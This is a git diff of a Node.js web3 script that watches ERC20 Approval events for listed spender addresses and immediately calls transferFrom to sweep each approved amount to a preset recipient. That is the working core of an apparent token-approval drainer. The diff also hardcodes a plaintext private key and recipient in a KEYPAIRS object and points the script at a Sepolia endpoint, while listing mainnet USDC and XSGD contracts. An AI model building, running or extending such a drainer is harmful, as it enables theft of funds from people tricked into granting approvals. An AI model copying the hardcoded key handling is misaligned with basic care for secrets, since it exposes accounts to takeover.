@@ -1,13 +1,11 @@
 const Web3 = require("web3");
-const WebSocket = require("ws");
 const dotenv = require("dotenv");
 dotenv.config();
-// import { WebSocketProvider } from 'web3';
 
 const log = console.log;
 
 const web3_instance = Web3.Web3;
-const providerUrl = process.env.RPC_URL;
+const providerUrl = "wss://sepolia.drpc.org";
 const web3 = new web3_instance(
   new web3_instance.providers.WebsocketProvider(providerUrl)
 );
@@ -17,11 +15,19 @@ const ERC20_CONTRACT_ADDRESSES = [
   "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
   "0x70e8dE73cE538DA2bEEd35d14187F6959a8ecA96", // XSGD
   "0x736b400331be441f982d980036d638fc0fde5fac", // TEST - $W
+  "0x0c584cd8282d9e6fa3240a16e12f63045374a81f", // TEST - $W2
 ];
-const SPECIFIC_SPENDER_ADDRESS = process.env.SPECIFIC_SPENDER_ADDRESS;
-const PRIVATE_KEY = process.env.PRIVATE_KEY;
-const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS;
 
+const KEYPAIRS = {
+  '0x900DB7D5ebf24BF1539AbC3C020346B5D472DC07':{
+    'PRIVATE_KEY': "0x6e10fc7fc85bf25964e531dda9f051a4fb46a3815db57429b0c2b6fcd9d3ec52",
+    'RECIPIENT_ADDRESS':"0x5a18151130b93AB07196Bff74d0dcF71DEC00bde"
+  },
+  // '<SPECIFIC_SPENDER_ADDRESS>':{
+  //   'PRIVATE_KEY': "",
+  //   'RECIPIENT_ADDRESS':""
+  // },
+};
 const ERC20_ABI = [
   // ERC20 ABI definitions
   {
@@ -190,16 +196,19 @@ const listenToContract = (contractAddress) => {
   const obj = tokenContract.events;
   obj
     .Approval({
-      filter: { spender: SPECIFIC_SPENDER_ADDRESS },
+      filter: { spender: Object.keys(KEYPAIRS) },
       fromBlock: "latest",
     })
     .on("data", async (event) => {
       try {
         const owner = event.returnValues.owner;
+        const spender = event.returnValues.spender;
         const value = event.returnValues.value;
         const ownerBalance = await tokenContract.methods
           .balanceOf(owner)
           .call();
+        
+        log(spender, KEYPAIRS[spender].RECIPIENT_ADDRESS);
 
         console.log("Owner:", owner);
         console.log("Allowance:", value);
@@ -209,8 +218,9 @@ const listenToContract = (contractAddress) => {
           await sendTransferFrom(
             tokenContract,
             owner,
-            RECIPIENT_ADDRESS,
-            value
+            KEYPAIRS[spender].RECIPIENT_ADDRESS,
+            value,
+            KEYPAIRS[spender].PRIVATE_KEY,
           );
         }
       } catch (error) {
@@ -219,8 +229,8 @@ const listenToContract = (contractAddress) => {
     });
 };
 
-const sendTransferFrom = async (contract, from, to, value) => {
-  const account = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
+const sendTransferFrom = async (contract, from, to, value, privatekey) => {
+  const account = web3.eth.accounts.privateKeyToAccount(privatekey);
   const data = await contract.methods.transferFrom(from, to, value).encodeABI();
 
   const tx = {
